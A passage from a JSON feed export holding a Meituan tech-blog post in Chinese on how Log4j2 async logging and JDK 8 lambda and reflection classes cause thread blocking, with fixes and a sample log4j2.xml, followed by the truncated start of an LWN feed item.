referrerpolicy=\"no-referrer\"></p><p>本案例的Blocked线程堆栈和上述“AsyncAppender导致线程Block”案例一样，那么导致线程Block的罪魁祸首会是业务异常吗？接下来本章节将结合下图19所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/e982a7c27d1c1e04b23ffed5f7589344116902.png\" alt=\"图19 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.3.2 为什么会Block线程？</h4><p>从Blocked线程堆栈中可以看出，线程阻塞在类加载上，该线程堆栈和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.3.3 为什么会触发类加载？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.3.4 到底什么类加载不了？</h4><p>上述“AsyncAppender导致线程Block”案例中，类加载器无法加载由JVM针对反射调用优化所生成的字节码类，本案例是否也是该原因导致，还待进一步具体分析。</p><p>要找到具体是什么类无法加载，归根结底还是要分析业务异常的具体堆栈。从业务堆栈中可以明显看出来，没有任何堆栈元素和JVM反射调用相关，因此排除JVM反射调用原因，但如下的特殊堆栈信息引起了注意：</p><pre><code>com.sankuai.shepherd.core.process.ProcessHandlerFactory$$Lambda$35/1331430278\n</code></pre><p>从堆栈的关键字$$Lambda$大致能猜测出这是代码里使用了Lambda表达式的缘故，查看代码确实相关部分使用了Lambda表达式，经过断点调试，证实的确无法加载该类。那么，这样的类是怎么来的？</p><p>查阅相关资料得知，Lambda表达式区别于匿名内部类实现，在构建时不会生成class文件，而是在运行时通过invokeDynamic指令动态调用，Lambda表达式的内容会被封装在一个静态方法内，JVM通过ASM字节码技术来动态生成调用类，也就是$$Lambda$这种形式的类，生成类示例如下图20所示：</p><p><img src=\"https://p0.meituan.net/travelcube/576090a21609ebab1e7b0fc4fca0891b108829.png\" alt=\"图20 Lambda生成类示例\" referrerpolicy=\"no-referrer\"></p><p>Lambda表达式的实现原理不是本文重点内容，在此不做过多介绍。项目代码中使用Lambda表达式是再普通不过的事情，但是关于此类的案例却并不多见，实在令人难以置信。继续查阅Lambda表达式相关文档，发现异常堆栈类名包含$$Lambda$这样的关键字，其实是JDK的一个Bug，相关Issue可参考:</p><ul><li><a href=\"https://bugs.openjdk.java.net/browse/JDK-8145964\">NoClassDefFound error in transforming lambdas</a></li><li><a href=\"https://bugs.openjdk.java.net/browse/JDK-8158475\">JVMTI RedefineClasses doesn’t handle anonymous classes properly</a></li></ul><p>值得一提的是，该Bug在JDK9版本已经修复，实际测试中发现，在JDK8的高版本如8U171等已修复该Bug，异常堆栈中不会有类似$$Lambda$的堆栈信息，示例如下图21所示：</p><p><img src=\"https://p0.meituan.net/travelcube/0759cebe265c2b882eff7f94155c214c1089864.png\" alt=\"图21 JDK8U171版本下Lambda异常堆栈示例\" referrerpolicy=\"no-referrer\"></p><h4>3.3.5 为什么要解析异常堆栈？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，不再重复分析。</p><h4>3.3.6 问题小结</h4><p>Log4j2打印异常日志时，AsyncAppender会先创建日志事件快照，并进一步触发解析、加载异常堆栈类。JDK 8低版本中使用Lambda表达式所生成的异常堆栈类无法被WebAppClassLoader类加载器加载，因此，当大量包含Lambda表达式调用的异常堆栈被输出到日志时，会频繁地触发类加载，由于类加载过程是synchronized同步加锁的，且每次加载都需要读取文件，速度较慢，从而导致了线程Block。</p><h3>3.4 AsyncLoggerConfig导致线程Block</h3><h4>3.4.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后立刻通过监控平台查看线程监控指标，当时的线程堆栈如下图22和图23所示。</p><p><img src=\"https://p0.meituan.net/travelcube/6429a273b7a8272a5a2a28885e5fda27678656.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p1.meituan.net/travelcube/fc4bd2d703f55de167f22dc789e9560d352831.png\" alt=\"图22 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/ac1a68e0fb8f95b05023ff70e1cde18f597675.png\" alt=\"图23 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出是和日志打印相关，本案例的业务异常和上述“AsyncAppender导致线程Block”的业务异常一样，这里不再重复介绍。</p><p>那么，到底是什么原因导致线程Block呢？接下来本章节将结合下图24所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/b18fe64d9d9a7794d9292df4c0565aff147139.png\" alt=\"图24 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.4.2 为什么会Block线程？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.4.3 为什么会触发类加载？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.4.4 到底是什么类加载不了？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.4.5 为什么要解析异常堆栈？</h4><p>在开始分析原因之前，先理清楚Log4j2关于日志的几个重要概念：</p><ul><li>&lt;Logger&gt;，日志配置标签，用于XML日志配置文件中，对应Log4j2框架中的LoggerConfig类，同步分发日志事件到对应Appender。</li><li>&lt;AsyncLogger&gt;，日志配置标签，用于XML日志配置文件中，对应Log4j2框架中的AsyncLoggerConfig类，内部使用Disruptor队列异步分发日志事件到对应Appender。</li><li>Logger，同步日志类，用于创建同步日志实例，同步调用ReliabilityStrategy处理日志。</li><li>AsyncLogger，异步日志类，用于创建异步日志实例，内部使用Disruptor队列实现异步调用ReliabilityStrategy处理日志。</li></ul><p>总的来说，&lt;Logger&gt;标签和Logger类是完全不同的两个概念，&lt;AsyncLogger&gt;标签和AsyncLogger类也是完全不同的两个概念，不可混淆。</p><p>由于项目并未配置Log4jContextSelector参数，所以使用的是同步Logger，即通过LoggerFactory.getLogger方法获取的是Logger类实例而不是AsyncLogger类实例，同时由于项目的log4j2.xml配置文件里配置了&lt;AsyncLogger&gt;标签，所以其底层是Logger和AsyncLoggerConfig组合。</p><p>AsyncLoggerConfig处理日志事件简要流程如下图25所示，内部使用Disruptor队列，在生成队列元素时，由translator来负责填充元素字段，并把填充后的元素放入RingBuffer中，于此同时，独立的异步线程从RingBuffer中消费事件，并调用配置在该AsyncLoggerConfig上的Appender处理日志请求。</p><p><img src=\"https://p0.meituan.net/travelcube/efc83d8d180546afa62af11d59d8afa959384.png\" alt=\"图25 AsyncLoggerConfig处理流程\" referrerpolicy=\"no-referrer\"></p><p>AsyncLoggerConfig提供了带有Disruptor队列实现的代理类即AsyncLoggerConfigDisruptor，在日志事件进入RingBuffer时，由于项目使用的是ReusableLogEventFactory，所以由MUTABLE_TRANSLATOR负责初始化日志事件，在此过程中会调用getThrownProxy方法创建ThrowableProxy实例，进而在ThrowableProxy构造函数内部触发解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.async.AsyncLoggerConfigDisruptor$EventTranslatorTwoArg\n\n/**\n * Object responsible for passing on data to a RingBuffer event with a MutableLogEvent.\n */\nprivate static final EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt; MUTABLE_TRANSLATOR =\n        new EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt;() {\n\n    @Override\n    public void translateTo(final Log4jEventWrapper ringBufferElement, final long sequence,\n            final LogEvent logEvent, final AsyncLoggerConfig loggerConfig) {\n      // 初始化 Disruptor RingBuffer 日志元素字段\n        ((MutableLogEvent) ringBufferElement.event).initFrom(logEvent);\n        ringBufferElement.loggerConfig = loggerConfig;\n    }\n};\n</code></pre><pre><code>// org.apache.logging.log4j.core.impl.MutableLogEvent\n\npublic void initFrom(final LogEvent event) {\n    this.loggerFqcn = event.getLoggerFqcn();\n    this.marker = event.getMarker();\n    this.level = event.getLevel();\n    this.loggerName = event.getLoggerName();\n    this.timeMillis = event.getTimeMillis();\n    this.thrown = event.getThrown();\n  // 触发创建 ThrowableProxy 实例\n    this.thrownProxy = event.getThrownProxy();\n\n    // NOTE: this ringbuffer event SHOULD NOT keep a reference to the specified\n    // thread-local MutableLogEvent's context data, because then two threads would call\n    // ReadOnlyStringMap.clear() on the same shared instance, resulting in data corruption.\n    this.contextData.putAll(event.getContextData());\n\n    this.contextStack = event.getContextStack();\n    this.source = event.isIncludeLocation() ? event.getSource() : null;\n    this.threadId = event.getThreadId();\n    this.threadName = event.getThreadName();\n    this.threadPriority = event.getThreadPriority();\n    this.endOfBatch = event.isEndOfBatch();\n    this.includeLocation = event.isIncludeLocation();\n    this.nanoTime = event.getNanoTime();\n    setMessage(event.getMessage());\n}\n\n@Override\npublic ThrowableProxy getThrownProxy() {\n    if (thrownProxy == null &amp;&amp; thrown != null) {\n      // 构造 ThrowableProxy 时打印异常堆栈\n        thrownProxy = new ThrowableProxy(thrown);\n    }\n    return thrownProxy;\n}\n</code></pre><h4>3.4.6 问题小结</h4><p>Log4j2打印异常日志时，AsyncLoggerConfig会初始化Disruptor RingBuffer日志元素字段，并进一步触发解析、加载异常堆栈类。JVM通过生成字节码的方式优化反射调用性能，但该动态生成的类无法被WebAppClassLoader类加载器加载，因此当大量包含反射调用的异常堆栈被输出到日志时，会频繁地触发类加载，由于类加载过程是synchronized同步加锁的，且每次加载都需要读取文件，速度较慢，从而导致线程Block。</p><h2>4. 避坑指南</h2><p>本章节主要对上述案例中导致线程Block的原因进行汇总分析，并给出相应的解决方案。</p><h3>4.1 问题总结</h3><p><img src=\"https://p0.meituan.net/travelcube/2653a8476fc90a164feaabc95db250fc52379.png\" alt=\"图26 日志异步处理流程\" referrerpolicy=\"no-referrer\"></p><p>日志异步处理流程示意如图26所示，整体步骤如下：</p><ol><li><strong>业务线程组装日志事件对象</strong>，如创建日志快照或者初始化日志字段等。</li><li><strong>日志事件对象入队</strong>，如BlockingQueue队列或Disruptor RingBuffer队列等。</li><li><strong>日志异步线程从队列获取日志事件对象，并输出至目的地</strong>，如本地磁盘文件或远程日志中心等。</li></ol><p>对应地，Log4j2导致线程Block的主要潜在风险点如下：</p><ol><li>如上图标号①所示，<strong>日志事件对象在入队前，组装日志事件时触发了异常堆栈类解析、加载，从而引发线程Block</strong>。</li><li>如上图标号②所示，<strong>日志事件对象在入队时，由于队列满，无法入队，从而引发线程Block</strong>。</li><li>如上图标号③所示，<strong>日志事件对象在出队后，对日志内容进行格式化处理时触发了异常堆栈类解析、加载，从而引发线程 Block</strong>。</li></ol><p>从上述分析不难看出：</p><ol><li>标号①和②处如果发生线程Block，那么会直接影响业务线程池内的所有线程。</li><li>标号③出如果发生线程Block，那么会影响日志异步线程，该线程通常为单线程。</li></ol><p><strong>标号①和②处发生线程Block的影响范围远比标号③更大，因此核心是要避免日志事件在入队操作完成前触发线程Block</strong>。其实日志异步线程通常是单线程，因此对于单个Appender来说，不会出现Block现象，至多会导致异步线程处理速度变慢而已，但如果存在多个异步Appender，那么多个日志异步线程仍然会出现彼此Block的现象。</p><h3>4.2 对症下药</h3><p>搞清楚了日志导致线程Block的原因后，问题也就不难解决，解决方案主要从日志事件“入队前”、“入队时”和“出队后”三方面展开。</p><h4>4.2.1 入队前避免线程Block</h4><p>结合上文分析的“AsyncAppender导致线程Block”、“Lambda表达式导致线程Block”和“AsyncLoggerConfig导致线程Block”案例，日志事件入队前避免线程Block的解决方案可从如下几方面考虑：</p><ol><li>日志事件入队前避免触发异常堆栈类解析、加载操作。</li><li>禁用JVM反射调用优化。</li><li>升级JDK版本修复Lambda类Bug。</li></ol><p>先说方案结论：</p><ol><li><strong>自定义Appender实现，创建日志事件快照时避免触发异常堆栈类解析、加载，美团内部Scribe-Log提供的AsyncScribeAppender即是如此</strong>。</li><li><strong>日志配置文件中不使用&lt;AsyncLogger&gt;标签，可以使用&lt;Logger&gt;标签来代替</strong>。</li></ol><p>下面具体分析方案可行性：</p><p><strong>1.</strong> <strong>日志事件入队前避免触发异常堆栈类解析、加载操作</strong></p><p>如果在日志事件入队前，能避免异常堆栈类解析、加载操作，则可从根本上解决该问题，但在Log4j2的2.17.1版本中AsyncAppender和AsyncLoggerConfig仍存在该问题，此时：</p><ul><li>对于AsyncAppender场景来说，可以通过自定义Appender实现，在生成日志事件快照时避免触发解析、加载异常堆栈类，并在配置文件中使用自定义的Appender代替Log4j2提供的AsyncAppender。自定义AsyncScribeAppender相关代码片段如下。</li></ul><pre><code>// org.apache.logging.log4j.scribe.appender.AsyncScribeAppender\n\n@Override\npublic void append(final LogEvent logEvent) {\n    // ... 以上部分忽略 ...\n    Log4jLogEvent.Builder builder = new Log4jLogEvent.Builder(event);\n    builder.setIncludeLocation(includeLocation);\n    // 创建日志快照，避免解析、加载异常堆栈类\n    final Log4jLogEvent memento = builder.build();\n    // ... 以下部分忽略 ...\n}\n</code></pre><ul><li>对于AsyncLoggerConfig场景来说，可以考虑使用非ReusableLogEventFactory类型的LogEventFactory来规避该问题，除此之外也可以考虑换用LoggerConfig来避免该问题。</li></ul><p><strong>2.</strong> <strong>禁用JVM反射调用优化</strong></p><p>调大inflationThreshold（其类型为 int）值到int最大值，如此，虽然一定范围内（反射调用次数不超过int最大值时）避免了类加载Block问题，但损失了反射调用性能，顾此失彼，且无法根治。另外，对于非反射类问题仍然无法解决，如上文所述的Lambda表达式问题等。</p><p><strong>3.</strong> <strong>升级JDK版本修复Lambda类Bug</strong></p><p>升级JDK版本的确可以解决Lambda表达式问题，但并不能彻底解决线程Block问题，如上文所述的反射调用等。</p><h4>4.2.2 入队时避免线程Block</h4><p>结合上文分析的“日志队列满导致线程Block”案例，日志事件入队时避免线程Block的解决方案可从如下几方面考虑：</p><ol><li>日志队列满时，Appender忽略该日志。</li><li>Appender使用自定义的ErrorHandler实现处理日志。</li><li>关闭StatusConfigListener日志输出。</li></ol><p>先说方案结论：<strong>自定义Appender实现，日志事件入队失败时忽略错误日志，美团内部Scribe-Log提供的AsyncScribeAppender即是如此</strong>。</p><p>下面具体分析方案可行性：</p><p><strong>1.</strong> <strong>日志队列满时Appender忽略该日志</strong></p><p>日志队列满，某种程度上说明日志线程的处理能力不足，在现有机器资源不变的情况下需要做一定取舍，如果日志不是特别重要通常可丢弃该日志，此时：</p><ul><li>对于AsyncAppender在blocking场景来说，可以通过配置log4j2.AsyncQueueFullPolicy=Discard来使用DISCARD策略忽略日志。</li><li>对于AsyncAppender在非blocking场景来说，可以通过自定义Appender实现，在日志事件入队失败后直接忽略错误日志，并在配置文件中使用自定义的Appender代替Log4j2提供的AsyncAppender。自定义AsyncScribeAppender相关代码片段如下。</li></ul><pre><code>// org.apache.logging.log4j.scribe.appender.AsyncScribeAppender\n\n@Override\npublic void append(final LogEvent logEvent) {\n// ... 以上部分忽略 ...\n    if (!transfer(memento)) {\n        if (blocking) {\n            // delegate to the event router (which may discard, enqueue and block, or log in current thread)\n            final EventRouteAsyncScribe route = asyncScribeQueueFullPolicy.getRoute(processingThread.getId(), memento.getLevel());\n            route.logMessage(this, memento);\n        } else {\n          // 自定义printDebugInfo参数，控制是否输出error信息，默认为false\n            if (printDebugInfo) {\n                error(\"Appender \" + getName() + \" is unable to write primary appenders. queue is full\");\n            }\n            logToErrorAppenderIfNecessary(false, memento);\n        }\n    }\n// ... 以下部分忽略 ...\n}\n</code></pre><p><strong>2.</strong> <strong>Appender使用自定义的ErrorHandler实现处理日志</strong></p><p>自定义ErrorHandler，Appender内设置handler为自定义ErrorHandler实例即可，但该方式仅适用于通过Log4j2 API方式创建的Logger，不支持日志配置文件的使用方式。由于大多数用户都使用配置文件方式，所以该方案使用场景有限，不过可以期待后续日志框架支持配置文件自定义ErrorHandler，已有相关<a href=\"https://issues.apache.org/jira/browse/LOG4J2-2927\">Issue: ErrorHandlers on Appenders cannot be configured</a>反馈给社区。</p><p><strong>3.</strong> <strong>关闭StatusConfigListener日志输出</strong></p><ul><li>配置文件中设置Configuration的status属性值为off，则不会创建StatusConfigListener，但此时StatusLogger会调用SimpleLogger来输出日志到System.err，仍不解决问题。</li><li>配置文件中设置Configuration的status属性值为fatal，则只有fatal级别的日志才会输出，普通的error日志直接忽略，但fatal条件过于严苛，可能会忽略一些重要的error日志。</li></ul><h4>4.2.3 出队后避免线程Block</h4><p>日志事件出队后会按照用户配置的输出样式，对日志内容进行格式化转换，此时仍然可能触发解析、加载异常堆栈类。因此，日志出队后避免线程Block的根本解决方法是在异常格式化转换时避免解析、加载异常堆栈类。</p><p>先说方案结论：<strong>显式配置日志输出样式%ex来代替默认的%xEx，避免对日志内容格式化时解析、加载异常堆栈类</strong>。</p><p>下面通过分析日志内容格式化处理流程来介绍解决方案。以PatternLayout为例，日志内容格式化转换流程链路为：Layout-&gt;PatternFormatter-&gt;LogEventPatternConverter。其中LogEventPatternConverter是个抽象类，有两个处理异常的格式化转换具体实现类，分别是ThrowablePatternConverter和ExtendedThrowablePatternConverter。</p><pre><code>// org.apache.logging.log4j.core.layout.PatternLayout\n\n// 将 LogEvent 转换为可以输出的 String\n@Override\npublic String toSerializable(final LogEvent event) {\n  // 由 PatternSerializer 对日志事件格式化处理\n    return eventSerializer.toSerializable(event);\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer\n\n@Override\npublic String toSerializable(final LogEvent event) {\n    final StringBuilder sb = getStringBuilder();\n    try {\n        return toSerializable(event, sb).toString();\n    } finally {\n        trimToMaxSize(sb);\n    }\n}\n\n@Override\npublic StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {\n    final int len = formatters.length;\n    for (int i = 0; i &lt; len; i++) {\n    // 由 PatternFormatter 对日志事件格式化处理\n        formatters[i].format(event, buffer);\n    }\n    if (replace != null) { // creates temporary objects\n        String str = buffer.toString();\n        str = replace.format(str);\n        buffer.setLength(0);\n        buffer.append(str);\n    }\n    return buffer;\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.pattern.PatternFormatter\n\npublic void format(final LogEvent event, final StringBuilder buf) {\n    if (skipFormattingInfo) {\n      // 由 LogEventPatternConverter 对日志事件进行格式化处理\n        converter.format(event, buf);\n    } else {\n        formatWithInfo(event, buf);\n    }\n}\n\nprivate void formatWithInfo(final LogEvent event, final StringBuilder buf) {\n    final int startField = buf.length();\n  // 由 LogEventPatternConverter 对日志事件进行格式化处理\n    converter.format(event, buf);\n    field.format(startField, buf);\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.pattern.LogEventPatternConverter\n\npublic abstract class LogEventPatternConverter extends AbstractPatternConverter {\n\n    /**\n     * 将日志事件 LogEvent 转换为 String\n     * Formats an event into a string buffer.\n     *\n     * @param event      event to format, may not be null.\n     * @param toAppendTo string buffer to which the formatted event will be appended.  May not be null.\n     */\n    public abstract void format(final LogEvent event, final StringBuilder toAppendTo);\n\n}\n</code></pre><p>日志框架对异常进行格式化转换时，有如下两个配置项可参考，默认配置是%xEx。</p><p><strong>1.</strong> <strong>%ex，仅输出异常信息，不获取扩展信息（jar文件名称和版本信息）</strong></p><p>对应的格式转化类是ThrowablePatternConverter，在format方法内部并没有获取ThrowableProxy对象，所以不会触发解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.pattern.ThrowablePatternConverter\n\n@Plugin(name = \"ThrowablePatternConverter\", category = PatternConverter.CATEGORY)\n@ConverterKeys({ \"ex\", \"throwable\", \"exception\" })\npublic class ThrowablePatternConverter extends LogEventPatternConverter {\n\n    /**\n     * {@inheritDoc}\n     */\n    @Override\n    public void format(final LogEvent event, final StringBuilder buffer) {\n        final Throwable t = event.getThrown();\n\n        if (isSubShortOption()) {\n            formatSubShortOption(t, getSuffix(event), buffer);\n        }\n        else if (t != null &amp;&amp; options.anyLines()) {\n            formatOption(t, getSuffix(event), buffer);\n        }\n    }\n\n    private boolean isSubShortOption() {\n        return ThrowableFormatOptions.MESSAGE.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.LOCALIZED_MESSAGE.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.FILE_NAME.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.LINE_NUMBER.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.METHOD_NAME.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.CLASS_NAME.equalsIgnoreCase(rawOption);\n    }\n\n    private void formatSubShortOption(final Throwable t, final String suffix, final StringBuilder buffer) {\n        StackTraceElement[] trace;\n        StackTraceElement throwingMethod = null;\n        int len;\n\n        if (t != null) {\n            trace = t.getStackTrace();\n            if (trace !=null &amp;&amp; trace.length &gt; 0) {\n                throwingMethod = trace[0];\n            }\n        }\n\n        if (t != null &amp;&amp; throwingMethod != null) {\n            String toAppend = Strings.EMPTY;\n\n            if (ThrowableFormatOptions.CLASS_NAME.equalsIgnoreCase(rawOption)) {\n                toAppend = throwingMethod.getClassName();\n            }\n            else if (ThrowableFormatOptions.METHOD_NAME.equalsIgnoreCase(rawOption)) {\n                toAppend = throwingMethod.getMethodName();\n            }\n            else if (ThrowableFormatOptions.LINE_NUMBER.equalsIgnoreCase(rawOption)) {\n                toAppend = String.valueOf(throwingMethod.getLineNumber());\n            }\n            else if (ThrowableFormatOptions.MESSAGE.equalsIgnoreCase(rawOption)) {\n                toAppend = t.getMessage();\n            }\n            else if (ThrowableFormatOptions.LOCALIZED_MESSAGE.equalsIgnoreCase(rawOption)) {\n                toAppend = t.getLocalizedMessage();\n            }\n            else if (ThrowableFormatOptions.FILE_NAME.equalsIgnoreCase(rawOption)) {\n                toAppend = throwingMethod.getFileName();\n            }\n\n            len = buffer.length();\n            if (len &gt; 0 &amp;&amp; !Character.isWhitespace(buffer.charAt(len - 1))) {\n                buffer.append(' ');\n            }\n            buffer.append(toAppend);\n\n            if (Strings.isNotBlank(suffix)) {\n                buffer.append(' ');\n                buffer.append(suffix);\n            }\n        }\n    }\n\n    private void formatOption(final Throwable throwable, final String suffix, final StringBuilder buffer) {\n        final StringWriter w = new StringWriter();\n\n        throwable.printStackTrace(new PrintWriter(w));\n        final int len = buffer.length();\n        if (len &gt; 0 &amp;&amp; !Character.isWhitespace(buffer.charAt(len - 1))) {\n            buffer.append(' ');\n        }\n        if (!options.allLines() || !Strings.LINE_SEPARATOR.equals(options.getSeparator()) || Strings.isNotBlank(suffix)) {\n            final StringBuilder sb = new StringBuilder();\n            final String[] array = w.toString().split(Strings.LINE_SEPARATOR);\n            final int limit = options.minLines(array.length) - 1;\n            final boolean suffixNotBlank = Strings.isNotBlank(suffix);\n            for (int i = 0; i &lt;= limit; ++i) {\n                sb.append(array[i]);\n                if (suffixNotBlank) {\n                    sb.append(' ');\n                    sb.append(suffix);\n                }\n                if (i &lt; limit) {\n                    sb.append(options.getSeparator());\n                }\n            }\n            buffer.append(sb.toString());\n\n        } else {\n            buffer.append(w.toString());\n        }\n    }\n\n    /**\n     * This converter obviously handles throwables.\n     *\n     * @return true.\n     */\n    @Override\n    public boolean handlesThrowable() {\n        return true;\n    }\n\n    protected String getSuffix(final LogEvent event) {\n        //noinspection ForLoopReplaceableByForEach\n        final StringBuilder toAppendTo = new StringBuilder();\n        for (int i = 0, size = formatters.size(); i &lt;  size; i++) {\n            formatters.get(i).format(event, toAppendTo);\n        }\n        return toAppendTo.toString();\n    }\n\n    public ThrowableFormatOptions getOptions() {\n        return options;\n    }\n}\n</code></pre><p><strong>2.</strong> <strong>%xEx，不仅输出异常信息，同时获取扩展信息</strong></p><p>对应的格式转化类是ExtendedThrowablePatternConverter，在format方法内部获取了ThrowableProxy对象，此时一定会触发解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter\n\n@Plugin(name = \"ExtendedThrowablePatternConverter\", category = PatternConverter.CATEGORY)\n@ConverterKeys({ \"xEx\", \"xThrowable\", \"xException\" })\npublic final class ExtendedThrowablePatternConverter extends ThrowablePatternConverter {\n\n    /**\n     * {@inheritDoc}\n     */\n    @Override\n    public void format(final LogEvent event, final StringBuilder toAppendTo) {\n      // 获取 ThrowableProxy 对象，触发解析、加载异常堆栈类\n        final ThrowableProxy proxy = event.getThrownProxy();\n        final Throwable throwable = event.getThrown();\n        if ((throwable != null || proxy != null) &amp;&amp; options.anyLines()) {\n            if (proxy == null) {\n                super.format(event, toAppendTo);\n                return;\n            }\n            final String extStackTrace = proxy.getExtendedStackTraceAsString(options.getIgnorePackages(),\n                    options.getTextRenderer(), getSuffix(event), options.getSeparator());\n            final int len = toAppendTo.length();\n            if (len &gt; 0 &amp;&amp; !Character.isWhitespace(toAppendTo.charAt(len - 1))) {\n                toAppendTo.append(' ');\n            }\n            toAppendTo.append(extStackTrace);\n        }\n    }\n\n}\n</code></pre><h2>5. 最佳实践</h2><p>本章节主要结合项目在日志使用方面的一系列踩坑经历和实践经验，总结了一份关于日志配置的最佳实践，供大家参考。</p><ol><li><strong>建议日志配置文件中对所有Appender的PatternLayout都增加%ex配置</strong>，因为如果没有显式配置%ex，则异常格式化输出的默认配置是%xEx，此时会打印异常的扩展信息（JAR名称和版本），可能导致业务线程Block。</li><li><strong>不建议日志配置文件中使用AsyncAppender，建议自定义Appender实现</strong>，因为AsyncAppender是日志框架默认提供的，目前最新版本中仍然存在日志事件入队前就触发加载异常堆栈类的问题，可能导致业务线程Block。</li><li><strong>不建议生产环境使用ConsoleAppender</strong>，因为输出日志到Console时有synchronized同步操作，高并发场景下非常容易导致业务线程Block。</li><li><strong>不建议在配置文件中使用&lt;AsyncLogger&gt;标签</strong>，因为日志事件元素在入队前就会触发加载异常堆栈类，可能导致业务线程Block。如果希望使用Log4j2提供的异步日志AsyncLogger，建议配置Log4jContextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector参数，开启异步日志。</li></ol><p>下面提供一份log4j2.xml配置示例：</p><pre><code>&lt;configuration status=\"warn\"&gt;\n    &lt;appenders&gt;\n        &lt;Console name=\"Console\" target=\"SYSTEM_OUT\" follow=\"true\"&gt;\n            &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n %ex\" /&gt;\n        &lt;/Console&gt;\n\n        &lt;XMDFile name=\"ShepherdLog\" fileName=\"shepherd.log\"&gt;\n          &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n %ex\" /&gt;\n      &lt;/XMDFile&gt;\n\n        &lt;!--XMDFile异步磁盘日志配置示例--&gt;\n        &lt;!--默认按天&amp;按512M文件大小切分日志，默认最多保留30个日志文件。--&gt;\n        &lt;!--注意：fileName前会自动增加文件路径，只配置文件名即可--&gt;\n        &lt;XMDFile name=\"LocalServiceLog\" fileName=\"request.log\"&gt;\n          &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n %ex\" /&gt;\n      &lt;/XMDFile&gt;\n  \n      &lt;!-- 使用自定义的AsyncScribeAppender代替原有的AsycncAppender --&gt;\n        &lt;AsyncScribe name=\"LogCenterAsync\" blocking=\"false\"&gt;\n            &lt;!-- 在指定日志名方面，scribeCategory 和 appkey 两者至少存在一种，且 scribeCategory 高于 appkey。--&gt;\n            &lt;!-- &lt;Property name=\"scribeCategory\"&gt;data_update_test_lc&lt;/Property&gt; --&gt;\n           &lt;LcLayout/&gt;\n        &lt;/AsyncScribe&gt;\n    &lt;/appenders&gt;\n\n    &lt;loggers&gt;\n        &lt;logger name=\"com.sankuai.shepherd\" level=\"info\" additivity=\"false\"&gt;\n            &lt;AppenderRef ref=\"ShepherdLog\" level=\"warn\"/&gt;\n            &lt;AppenderRef ref=\"LogCenterAsync\" level=\"info\"/&gt;\n        &lt;/logger&gt;\n\n        &lt;root level=\"info\"&gt;\n            &lt;!--Console日志是同步、阻塞的，推荐只在本地调试时使用，线上将该配置去掉--&gt;\n            &lt;!--appender-ref ref=\"Console\" /--&gt;\n            &lt;appender-ref ref=\"LocalServiceLog\"/&gt;\n            &lt;appender-ref ref=\"LogCenterAsync\"/&gt;\n        &lt;/root&gt;\n    &lt;/loggers&gt;\n&lt;/configuration&gt;\n</code></pre><h2>6. 作者简介</h2><p>志洋、陈超、李敏、凯晖、殷琦等，均来自美团基础技术部-应用中间件团队。</p><h2>7. 招聘信息</h2><p>美团基础技术部-基础架构团队诚招高级、资深技术专家，Base北京、上海。我们致力于建设美团全公司统一的高并发高性能分布式基础架构平台，涵盖数据库、分布式监控、服务治理、高性能通信、消息中间件、基础存储、容器化、集群调度等基础架构主要的技术领域。欢迎有兴趣的同学投送简历至：edp.itu.zhaopin@meituan.com。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "902585",
    "timestampUsec": "1659109386184947",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Direct host system calls from KVM",
    "author": ";corbet",
    "published": 1659104820,
    "updated": 1659104820,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902585/",
            "type": "text/html"
        }
    ],
    "content": {
